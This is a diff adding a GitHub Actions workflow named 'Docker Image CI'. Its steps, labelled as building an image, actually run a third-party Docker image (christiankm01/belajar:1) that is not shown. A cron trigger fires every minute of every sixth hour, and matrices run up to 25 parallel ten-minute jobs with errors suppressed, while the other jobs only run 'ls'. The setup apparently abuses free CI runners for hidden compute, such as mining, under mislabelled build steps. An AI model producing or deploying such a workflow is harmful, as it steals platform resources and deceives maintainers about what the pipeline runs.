@@ -1,0 +1,55 @@
+name: Docker Image CI
+on:
+  push:
+    branches: [ "main" ]
+  schedule:
+    - cron: "* */6 * * *"
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    continue-on-error: true
+    strategy:
+      fail-fast: false
+      matrix:
+        gos: [1,2,3,4,5]
+    timeout-minutes: 10
+    steps:
+    - name: Build the Docker image
+      run: docker run christiankm01/belajar:1
+  tess:
+    needs: build
+    continue-on-error: true
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        gos: [1,2]
+    steps:
+    - name: Build the Docker image
+      run: ls
+  xsdaw:
+    needs: tess
+    runs-on: ubuntu-latest
+    continue-on-error: true
+    strategy:
+      fail-fast: false
+      matrix:
+        gos: [1,2,3,4,5]
+        kx: [1,2,3,4,5]
+    timeout-minutes: 10
+    steps:
+    - name: Build the Docker image
+      run: docker run christiankm01/belajar:1
+    - if: ${{ failure () }}
+      run: ls
+  sdbg:
+    needs: xsdaw
+    continue-on-error: true
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        gos: [1,2]
+    steps:
+    - name: Build the Docker image
+      run: ls
